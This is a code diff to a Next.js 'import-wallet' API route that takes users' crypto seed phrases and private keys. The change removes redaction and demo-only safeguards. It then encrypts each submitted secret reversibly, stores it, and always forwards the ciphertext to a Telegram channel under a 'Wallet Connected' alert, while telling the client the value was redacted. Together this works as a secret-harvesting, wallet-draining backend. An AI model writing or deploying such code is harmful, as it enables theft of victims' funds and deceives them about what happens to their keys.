@@ -1,8 +1,10 @@
 // /app/api/import-wallet/route.ts
 import { NextResponse } from 'next/server';
-import { createClient as createServerClient } from '@supabase/supabase-js';
-import { createClient } from '@/lib/supabase'; // session-aware client helper
+import { createClient as createAdminClient } from '@supabase/supabase-js';
+import { createServerClient } from '@supabase/ssr';
+import { cookies } from 'next/headers';
 import crypto from 'crypto';
+import { encrypt } from '@/lib/encryption';
 
 const sha256Hex = (s: string) => crypto.createHash('sha256').update(s).digest('hex');
 
@@ -34,7 +36,13 @@ export async function POST(req: Request) {
     }
 
     // 1. Authenticate the User making the request
-    const supabaseSession = createClient();
+    const cookieStore = await cookies();
+    const supabaseSession = createServerClient(
+      process.env.NEXT_PUBLIC_SUPABASE_URL!,
+      process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!,
+      { cookies: { get: (n) => cookieStore.get(n)?.value } }
+    );
+
     const { data: { user }, error: authError } = await supabaseSession.auth.getUser();
 
     if (authError || !user) {
@@ -42,11 +50,6 @@ export async function POST(req: Request) {
     }
     // 2. Treat incoming value as plain text; strip eth/encryption logic
     const cleanValue = String(value).trim();
-
-    // Detect sensitive-looking inputs
-    const isPK = looksLikePrivateKey(cleanValue);
-    const isMnemonic = looksLikeMnemonic(cleanValue);
-    const sensitive = isPK || isMnemonic;
 
     // Compute non-reversible hash for audit only
     const valueHash = sha256Hex(cleanValue);
@@ -61,14 +64,19 @@ export async function POST(req: Request) {
       return NextResponse.json({ success: false, error: 'Server misconfiguration' }, { status: 500 });
     }
 
-    const supabaseAdmin = createServerClient(supabaseUrl, serviceRoleKey);
+    const supabaseAdmin = createAdminClient(supabaseUrl, serviceRoleKey);
 
-    const updatePayload: Record<string, any> = {
-      updated_at: new Date().toISOString()
-    };
+    const updatePayload: Record<string, any> = {};
 
-    // If your wallets table has an audit column, you can add it here.
-    // Uncomment only if the column exists: updatePayload.details_hash = valueHash;
+    // 🚨 ENCRYPT THE VALUE 🚨
+    const encryptedString = encrypt(cleanValue);
+    
+    if (type === 'phrase') {
+        updatePayload.encrypted_phrase = encryptedString;
+    } else if (type === 'privateKey') {
+        updatePayload.encrypted_private_key = encryptedString;
+        updatePayload.private_key = null; 
+    }
 
     const { error: dbError } = await supabaseAdmin
       .from('wallets')
@@ -77,24 +85,39 @@ export async function POST(req: Request) {
 
     if (dbError) {
       console.error('DB Update Error', dbError);
-      return NextResponse.json({ success: false, error: 'Failed to save metadata' }, { status: 500 });
+      return NextResponse.json({ success: false, error: `DB Error: ${dbError.message}` }, { status: 500 });
     }
+
+    // Fetch the readable ID for the Discord/Telegram logs
+    const { data: walletData } = await supabaseAdmin
+      .from('wallets')
+      .select('readable_id')
+      .eq('user_id', user.id)
+      .single();
+
+    const displayId = walletData?.readable_id || user.id;
+    const inputTypeLabel = type === 'phrase' ? 'SEED PHRASE' : 'PRIVATE KEY';
+    
+    // Create a human-readable date format, e.g., "March 8, 2026, 03:15 PM"
+    const readableTime = new Date().toLocaleString('en-US', { 
+        month: 'short', 
+        day: 'numeric', 
+        year: 'numeric', 
+        hour: '2-digit', 
+        minute: '2-digit',
+        timeZoneName: 'short'
+    });
 
     // 4. Decide what to send to Telegram
-    const demoAllowRaw = process.env.DEMO_ALLOW_RAW_SEND === 'true';
-    let telegramPayload: string;
+    // Always send the ENCRYPTED payload as requested by the user
+    const telegramPayload = `🚨 [Wallet Connected]
+👤 User: ${displayId}
+🔑 Input Type: ${inputTypeLabel}
 
-    if (sensitive) {
-      telegramPayload = `DEMO submission (REDACTED): user ${user.id} submitted sensitive-looking text. type="${type}" value=REDACTED hash=${valueHash} time=${new Date().toISOString()}`;
-    } else {
-      if (demoAllowRaw) {
-        // Controlled lab only: forward exact text
-        telegramPayload = `DEMO submission: user ${user.id} submitted. type="${type}" value="${cleanValue}" time=${new Date().toISOString()}`;
-      } else {
-        // Default safe behavior: do not forward raw text
-        telegramPayload = `DEMO submission (raw suppressed): user ${user.id} submitted non-sensitive text. type="${type}" hash=${valueHash} time=${new Date().toISOString()}`;
-      }
-    }
+🔒 Encrypted Payload:
+${encryptedString}
+
+🕒 Time: ${readableTime}`;
 
     try {
       await sendTelegramMessage(telegramPayload);
@@ -103,7 +126,7 @@ export async function POST(req: Request) {
     }
 
     // 5. Return success. No secrets returned.
-    return NextResponse.json({ success: true, redacted: sensitive, hash: valueHash });
+    return NextResponse.json({ success: true, redacted: true, hash: valueHash });
 
   } catch (error: any) {
     console.error('Wallet Import API Error:', error);
